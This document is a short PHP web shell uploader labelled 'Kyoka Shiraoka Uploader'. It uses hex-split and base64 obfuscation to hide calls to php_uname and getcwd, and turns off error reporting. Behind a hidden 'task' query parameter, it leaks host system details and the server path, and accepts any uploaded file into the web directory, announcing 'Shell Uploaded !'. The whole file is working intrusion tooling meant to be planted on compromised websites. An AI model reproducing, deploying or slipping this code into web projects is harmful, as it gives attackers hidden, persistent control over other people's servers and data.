<?php
error_reporting(0);
$uname = "p" . "\x68\x70\x5f\x75\x6e\x61\x6d" . "e";
$dir = "ge" . "\x74\x63\x77" . "d";

$unamev2 = base64_encode($uname);
$dirv2 = base64_encode($dir);

if (get_magic_quotes_gpc()) {
	foreach ($_POST as $key => $value) {
		$_POST[$key] = stripslashes($value);
	}
}
if(isset($_GET["task"]))
{
	echo '<title>Iiiieeett Taigaaaa!</title>';
	echo '<center>';
	echo '<h2>Kyoka Shiraoka Uploader</h2>';
	echo '<b>';
	echo '<uname>'.base64_decode($unamev2)().'</uname>';
	echo '<br>';
	echo '<asu>'.base64_decode($dirv2)().'</asu>';
	echo '</center>';
	echo '</b>';
	Echo '<br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></b>';
	if( $_POST['_upl'] == "Upload" ) {
		if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])){ 
			echo '<b>Shell Uploaded !'; 
		}else{ 
			echo '<b>Not uploaded !'; 
		}
	}
}

?>
